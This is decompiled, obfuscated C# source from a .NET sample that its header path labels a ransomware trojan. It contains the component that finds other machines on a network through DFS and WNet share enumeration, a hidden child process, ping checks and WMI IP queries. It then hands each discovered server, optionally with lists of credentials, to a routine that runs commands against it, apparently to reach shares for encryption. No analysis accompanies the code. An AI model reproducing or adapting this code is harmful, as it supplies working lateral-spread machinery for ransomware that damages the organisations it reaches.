// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.bksiKRlToNsI
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using SmartAssembly.Delegates;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace oXSOOyVgTNm
{
  internal sealed class bksiKRlToNsI
  {
    public static List<string> yoyMxIUMJTOs;
    public static string xjtQKOznTmMvHQn;
    public static List<string> YruVSpqbZI;
    public static List<string> DGrMJBvIrlFsyO;
    public static List<string> IJbtalCslfuH;
    [NonSerialized]
    internal static GetString \u0083;

    public static List<bksiKRlToNsI.bRVzMRuBZonef> gIvECBAdQThf()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = bksiKRlToNsI.\u0083(107397166);
        process.StartInfo.Arguments = bksiKRlToNsI.\u0083(107402166);
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        List<bksiKRlToNsI.bRVzMRuBZonef> bRvzMruBzonefList1 = new List<bksiKRlToNsI.bRVzMRuBZonef>();
        while (!process.StandardOutput.EndOfStream)
        {
          string str = process.StandardOutput.ReadLine();
          if (str == bksiKRlToNsI.\u0083(107402149))
            return (List<bksiKRlToNsI.bRVzMRuBZonef>) null;
          if (str != string.Empty && str[0] == '\\' && str[1] == '\\')
          {
            StringBuilder stringBuilder = new StringBuilder();
            for (int index = 2; index < str.Length && str[index] != ' '; ++index)
              stringBuilder.Append(str[index]);
            List<bksiKRlToNsI.bRVzMRuBZonef> bRvzMruBzonefList2 = bRvzMruBzonefList1;
            bksiKRlToNsI.bRVzMRuBZonef bRvzMruBzonef1 = new bksiKRlToNsI.bRVzMRuBZonef();
            bRvzMruBzonef1.set_ServerName(bksiKRlToNsI.\u0083(107397171) + stringBuilder.ToString() + bksiKRlToNsI.\u0083(107401592));
            bksiKRlToNsI.bRVzMRuBZonef bRvzMruBzonef2 = bRvzMruBzonef1;
            bRvzMruBzonefList2.Add(bRvzMruBzonef2);
          }
        }
        process.WaitForExit();
        process.Close();
        return bRvzMruBzonefList1;
      }
      catch
      {
        return (List<bksiKRlToNsI.bRVzMRuBZonef>) null;
      }
    }

    [DllImport("Netapi32.dll", EntryPoint = "NetDfsEnum", CharSet = CharSet.Auto)]
    public static extern int mnTtVpzBCxWpjj(
      [MarshalAs(UnmanagedType.LPWStr)] string yQOLhuIjCiihcq,
      int gfNxCbNyFAPE,
      int NfpVjvLVxvE,
      out IntPtr pOhekYyqTnUcsN,
      [MarshalAs(UnmanagedType.I4)] out int uLBrvfuGOGdo,
      [MarshalAs(UnmanagedType.I4)] ref int ionxnTsrdXzTIN);

    public static List<bksiKRlToNsI.OVjTnZfcfhu> pjfRDyQZmIc([In] string obj0)
    {
      try
      {
        List<bksiKRlToNsI.OVjTnZfcfhu> ovjTnZfcfhuList = new List<bksiKRlToNsI.OVjTnZfcfhu>();
        IntPtr pOhekYyqTnUcsN = new IntPtr();
        int uLBrvfuGOGdo = 0;
        int ionxnTsrdXzTIN = 0;
        if (bksiKRlToNsI.mnTtVpzBCxWpjj(obj0, 3, 268435455, out pOhekYyqTnUcsN, out uLBrvfuGOGdo, ref ionxnTsrdXzTIN) == 0)
        {
          for (int index1 = 0; index1 < uLBrvfuGOGdo; ++index1)
          {
            bksiKRlToNsI.UjEcTTklCLjTX structure1 = (bksiKRlToNsI.UjEcTTklCLjTX) Marshal.PtrToStructure(pOhekYyqTnUcsN + index1 * Marshal.SizeOf(typeof (bksiKRlToNsI.UjEcTTklCLjTX)), typeof (bksiKRlToNsI.UjEcTTklCLjTX));
            if (!(structure1.WtJkCujfuRGbI == obj0))
            {
              List<string> stringList = new List<string>();
              for (int index2 = 0; (long) index2 < (long) structure1.DIdoHvNcMqzb; ++index2)
              {
                bksiKRlToNsI.LTIOFfRHBJkfAIj structure2 = (bksiKRlToNsI.LTIOFfRHBJkfAIj) Marshal.PtrToStructure(new IntPtr(structure1.IVAPBdYWSTwlXCloU.ToInt64() + (long) (index2 * Marshal.SizeOf(typeof (bksiKRlToNsI.LTIOFfRHBJkfAIj)))), typeof (bksiKRlToNsI.LTIOFfRHBJkfAIj));
                if (structure2.xBweNKiNSrFH == 2)
                  stringList.Add(Path.Combine(new string[3]
                  {
                    bksiKRlToNsI.\u0083(107388497),
                    structure2.KCBliPTydnZ,
                    structure2.dabiGivdHDn
                  }));
              }
              string str = structure1.WtJkCujfuRGbI.Replace(obj0, bksiKRlToNsI.\u0083(107389422));
              if (str.StartsWith(bksiKRlToNsI.\u0083(107397171)))
                str = str.Substring(1);
              ovjTnZfcfhuList.Add(new bksiKRlToNsI.OVjTnZfcfhu(str, stringList.ToArray()));
            }
          }
        }
        return ovjTnZfcfhuList;
      }
      catch (Exception ex)
      {
        return (List<bksiKRlToNsI.OVjTnZfcfhu>) null;
      }
    }

    public static void jQYZolePlVmaQQgs()
    {
      NuHMiFuRoVNiZNRl.JIJxgqGiTDGj(bksiKRlToNsI.\u0083(107401615));
      List<bksiKRlToNsI.bRVzMRuBZonef> bRvzMruBzonefList = bksiKRlToNsI.gIvECBAdQThf();
      List<bksiKRlToNsI.OVjTnZfcfhu> ovjTnZfcfhuList = bksiKRlToNsI.pjfRDyQZmIc(Environment.MachineName);
      if (ovjTnZfcfhuList != null)
      {
        foreach (bksiKRlToNsI.OVjTnZfcfhu ovjTnZfcfhu in ovjTnZfcfhuList)
        {
          foreach (string str in ovjTnZfcfhu.JWTCfxNuXFpg)
          {
            if (!str.Contains(Environment.MachineName))
            {
              try
              {
                if (NuHMiFuRoVNiZNRl.bCrEAAPvBiMx == bksiKRlToNsI.\u0083(107397249))
                {
                  for (int index = 0; index < bksiKRlToNsI.YruVSpqbZI.Count; ++index)
                    NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(bksiKRlToNsI.\u0083(107388460), bksiKRlToNsI.\u0083(107401498) + str + bksiKRlToNsI.\u0083(107388406) + bksiKRlToNsI.YruVSpqbZI[index] + bksiKRlToNsI.\u0083(107388425) + bksiKRlToNsI.DGrMJBvIrlFsyO[index]);
                }
                else
                  NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(bksiKRlToNsI.\u0083(107388460), bksiKRlToNsI.\u0083(107401498) + str);
                NuHMiFuRoVNiZNRl.lrbABqBtwmdm.Add(str.Replace(bksiKRlToNsI.\u0083(107387741), bksiKRlToNsI.\u0083(107389422)));
              }
              catch
              {
              }
            }
          }
        }
      }
      if (bRvzMruBzonefList == null)
        return;
      foreach (bksiKRlToNsI.bRVzMRuBZonef bRvzMruBzonef in bRvzMruBzonefList)
      {
        if (!bRvzMruBzonef.get_ServerName().Contains(Environment.MachineName))
        {
          try
          {
            if (NuHMiFuRoVNiZNRl.bCrEAAPvBiMx == bksiKRlToNsI.\u0083(107397249))
            {
              for (int index = 0; index < bksiKRlToNsI.YruVSpqbZI.Count; ++index)
                NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(bksiKRlToNsI.\u0083(107388460), bksiKRlToNsI.\u0083(107401498) + bRvzMruBzonef.get_ServerName() + bksiKRlToNsI.\u0083(107388406) + bksiKRlToNsI.YruVSpqbZI[index] + bksiKRlToNsI.\u0083(107388425) + bksiKRlToNsI.DGrMJBvIrlFsyO[index]);
            }
            else
              NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(bksiKRlToNsI.\u0083(107388460), bksiKRlToNsI.\u0083(107401498) + bRvzMruBzonef.get_ServerName());
            NuHMiFuRoVNiZNRl.lrbABqBtwmdm.Add(bRvzMruBzonef.get_ServerName().Replace(bksiKRlToNsI.\u0083(107387741), bksiKRlToNsI.\u0083(107389422)));
          }
          catch
          {
          }
        }
      }
    }

    public static bool yXUOPNzIwXy([In] string obj0)
    {
      bool flag = false;
      Ping ping = (Ping) null;
      try
      {
        using (ping = new Ping())
          flag = ping.Send(obj0).Status == IPStatus.Success;
      }
      catch (PingException ex)
      {
      }
      finally
      {
        ping?.Dispose();
      }
      return flag;
    }

    public static List<string> xLVcoERcsssY()
    {
      string[] source1 = (string[]) null;
      try
      {
        ArrayList arrayList = new ArrayList();
        foreach (ManagementObject managementObject in new ManagementObjectSearcher(bksiKRlToNsI.\u0083(107401521)).Get())
        {
          if ((bool) managementObject[bksiKRlToNsI.\u0083(107401456)])
          {
            foreach (string str in (string[]) managementObject[bksiKRlToNsI.\u0083(107401411)])
              arrayList.Add((object) str);
          }
        }
        if (arrayList.Count > 0)
        {
          source1 = new string[arrayList.Count];
          arrayList.CopyTo((Array) source1);
        }
        else
          source1 = new string[0];
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (source1 == null)
          return (List<string>) null;
        foreach (string str in source1)
        {
          Func<string, bool> func = (Func<string, bool>) null;
          bksiKRlToNsI.xwvKVpLVwrOefD xwvKvpLvwrOefD = new bksiKRlToNsI.xwvKVpLVwrOefD();
          xwvKvpLvwrOefD.exNLxMGgVha = str;
          if (xwvKvpLvwrOefD.exNLxMGgVha.Contains(bksiKRlToNsI.\u0083(107401398)))
          {
            string[] source2 = source1;
            if (func == null)
              func = new Func<string, bool>(xwvKvpLvwrOefD.\u003CGetIPAddresses\u003Eb__5);
            Func<string, bool> predicate = func;
            source1 = ((IEnumerable<string>) source2).Where<string>(predicate).ToArray<string>();
          }
        }
        return ((IEnumerable<string>) source1).ToList<string>();
      }
      catch
      {
        return (List<string>) null;
      }
    }

    static bksiKRlToNsI()
    {
      SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (bksiKRlToNsI));
      bksiKRlToNsI.yoyMxIUMJTOs = new List<string>();
      bksiKRlToNsI.xjtQKOznTmMvHQn = bksiKRlToNsI.\u0083(107389422);
      bksiKRlToNsI.YruVSpqbZI = new List<string>();
      bksiKRlToNsI.DGrMJBvIrlFsyO = new List<string>();
      bksiKRlToNsI.IJbtalCslfuH = new List<string>();
    }

    public sealed class bRVzMRuBZonef
    {
      private string \u003CServerName\u003Ek__BackingField;

      [SpecialName]
      public string get_ServerName() => this.\u003CServerName\u003Ek__BackingField;

      [SpecialName]
      public void set_ServerName([In] string obj0) => this.\u003CServerName\u003Ek__BackingField = obj0;
    }

    public enum UdoguuIsTpiX
    {
      wUzOpcypwf = 1,
      LqFxtPCChcgDy = 2,
      ryWStcJujYEtwj = 3,
      insfCdfLacUte = 4,
      pCNwvyByRwvKdfS = 5,
    }

    public enum JVLOWTTxfSVd
    {
      nQTnZXVqgqy,
      zEbwsNcGcurJS,
      MSZcoCoSybqqcZJ,
      lIWDphnrhZVIny,
    }

    public enum nrmagkVZFkNvUV
    {
      TjxJHoZTXywkxts = 1,
      xsgRBvilMSv = 2,
      KxInhIGPDntr = 4,
      wtmuFTYzwhVxFdLdp = 8,
      eSpxgcxObPbFQow = 16, // 0x00000010
      AkykNRdLLPoK = 19, // 0x00000013
    }

    public enum lSmwsLTeQWh
    {
      UgzNvPGFODuvC,
      lmUWkAPNUJ,
      VQyOWQEJQZtry,
      oJyAOcCxvWN,
      yVEYPMzuKaN,
      NPIRjLzcCcml,
      hAFZRcXGumqsP,
      RewWMUwAaj,
      IlZrRYVUCpUduW,
      wzBDKiGRrO,
      guQztNUXsxJ,
      wKPrZIGTrLD,
    }

    public sealed class XIcMBLeICLrfP : IEnumerable
    {
      private ArrayList oOLfnxGnle = new ArrayList();

      [DllImport("Mpr.dll", EntryPoint = "WNetOpenEnumA")]
      private static extern bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU WNetOpenEnum(
        bksiKRlToNsI.UdoguuIsTpiX dwScope,
        bksiKRlToNsI.JVLOWTTxfSVd dwType,
        bksiKRlToNsI.nrmagkVZFkNvUV dwUsage,
        bksiKRlToNsI.XIcMBLeICLrfP.kHRtAFHTdhROx p,
        out IntPtr lphEnum);

      [DllImport("Mpr.dll")]
      private static extern bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU WNetCloseEnum(
        [In] IntPtr obj0);

      [DllImport("Mpr.dll", EntryPoint = "WNetEnumResourceA")]
      private static extern bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU WNetEnumResource(
        [In] IntPtr obj0,
        [In] ref uint obj1,
        [In] IntPtr obj2,
        [In] ref uint obj3);

      private void EnumerateServers(
        [In] bksiKRlToNsI.XIcMBLeICLrfP.kHRtAFHTdhROx obj0,
        [In] bksiKRlToNsI.UdoguuIsTpiX obj1,
        [In] bksiKRlToNsI.JVLOWTTxfSVd obj2,
        [In] bksiKRlToNsI.nrmagkVZFkNvUV obj3,
        [In] bksiKRlToNsI.lSmwsLTeQWh obj4)
      {
        uint cb = 16384;
        IntPtr num1 = Marshal.AllocHGlobal((int) cb);
        IntPtr lphEnum = IntPtr.Zero;
        uint num2 = 1;
        if (bksiKRlToNsI.XIcMBLeICLrfP.WNetOpenEnum(obj1, obj2, obj3, obj0, out lphEnum) == bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU.NyUkBmonSde)
        {
          bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU yxqCyZhclzvXqU;
          do
          {
            yxqCyZhclzvXqU = bksiKRlToNsI.XIcMBLeICLrfP.WNetEnumResource(lphEnum, ref num2, num1, ref cb);
            if (yxqCyZhclzvXqU == bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU.NyUkBmonSde)
            {
              Marshal.PtrToStructure<bksiKRlToNsI.XIcMBLeICLrfP.kHRtAFHTdhROx>(num1, obj0);
              if (obj0.dOuYCpcVSYEbsH == obj4)
                this.oOLfnxGnle.Add((object) obj0.HEASRZNNwgCPDDj);
              if ((obj0.PAnrVCxhmEdgEZ & bksiKRlToNsI.nrmagkVZFkNvUV.xsgRBvilMSv) == bksiKRlToNsI.nrmagkVZFkNvUV.xsgRBvilMSv)
                this.EnumerateServers(obj0, obj1, obj2, obj3, obj4);
            }
            else if (yxqCyZhclzvXqU != bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU.xHTQPsuHUOKdqOKn)
              break;
          }
          while (yxqCyZhclzvXqU != bksiKRlToNsI.XIcMBLeICLrfP.yxqCyZhclzvXqU.xHTQPsuHUOKdqOKn);
          int num3 = (int) bksiKRlToNsI.XIcMBLeICLrfP.WNetCloseEnum(lphEnum);
        }
        Marshal.FreeHGlobal(num1);
      }

      public XIcMBLeICLrfP(
        [In] bksiKRlToNsI.UdoguuIsTpiX obj0,
        [In] bksiKRlToNsI.JVLOWTTxfSVd obj1,
        [In] bksiKRlToNsI.nrmagkVZFkNvUV obj2,
        [In] bksiKRlToNsI.lSmwsLTeQWh obj3)
      {
        this.EnumerateServers(new bksiKRlToNsI.XIcMBLeICLrfP.kHRtAFHTdhROx(), obj0, obj1, obj2, obj3);
      }

      public IEnumerator GetEnumerator() => this.oOLfnxGnle.GetEnumerator();

      private enum yxqCyZhclzvXqU
      {
        NyUkBmonSde = 0,
        xHTQPsuHUOKdqOKn = 259, // 0x00000103
      }

      [StructLayout(LayoutKind.Sequential)]
      private sealed class kHRtAFHTdhROx
      {
        public bksiKRlToNsI.UdoguuIsTpiX aJSZOGbnMAOmpYLZ;
        public bksiKRlToNsI.JVLOWTTxfSVd xKxpeyPISae;
        public bksiKRlToNsI.lSmwsLTeQWh dOuYCpcVSYEbsH;
        public bksiKRlToNsI.nrmagkVZFkNvUV PAnrVCxhmEdgEZ;
        public string DtFlJrZbioMD;
        public string HEASRZNNwgCPDDj;
        public string viqaxgTZWseFvShq;
        public string aMOuRirddmdN;
      }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct UjEcTTklCLjTX
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string WtJkCujfuRGbI;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string QonunijUAMlq;
      public uint xBweNKiNSrFH;
      public uint DIdoHvNcMqzb;
      public IntPtr IVAPBdYWSTwlXCloU;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LTIOFfRHBJkfAIj
    {
      public int xBweNKiNSrFH;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string KCBliPTydnZ;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string dabiGivdHDn;
    }

    public struct OVjTnZfcfhu
    {
      public string kfCoSBpLCZsGLdM;
      public string[] JWTCfxNuXFpg;

      public OVjTnZfcfhu([In] string obj0, [In] string[] obj1)
      {
        this.kfCoSBpLCZsGLdM = obj0;
        this.JWTCfxNuXFpg = obj1;
      }
    }

    private sealed class xwvKVpLVwrOefD
    {
      public string exNLxMGgVha;

      public bool \u003CGetIPAddresses\u003Eb__5([In] string obj0) => obj0 != this.exNLxMGgVha;
    }
  }
}
